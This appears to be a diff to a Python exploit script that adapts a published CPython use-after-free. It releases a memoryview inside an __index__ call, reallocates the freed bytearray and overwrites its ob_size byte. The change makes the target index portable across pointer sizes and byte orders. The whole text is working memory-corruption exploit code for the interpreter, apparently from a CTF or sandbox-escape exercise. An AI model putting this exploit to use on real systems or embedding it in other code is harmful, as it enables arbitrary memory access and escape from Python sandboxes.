@@ -218,6 +218,8 @@ err_format:
 
 # So with that in mind, we can just modify chilaxan's exploit to work with the 'c' format instead of 'P'
 
+from common import PTR_SIZE, BYTEORDER
+
 uaf_backing = bytearray(bytearray.__basicsize__)
 uaf_view = memoryview(uaf_backing).cast('c') # bytes format
 
@@ -226,7 +228,8 @@ class weird_index:
         uaf_view.release() # release memoryview (UAF)
         # free `uaf_backing` memory and allocate a new bytearray into it
         self.memory_backing = uaf_backing.clear() or bytearray()
-        return 0x17 # idx of high byte of `ob_size` (64-bit little-endian)
+        IDX = PTR_SIZE * 2 + (0 if BYTEORDER == 'big' else PTR_SIZE - 1)
+        return IDX # idx of high byte of `ob_size`
 
 # by the time this line finishes executing, it writes 0x7f
 # into the high byte of the `ob_size` slot (2) of `memory_backing`
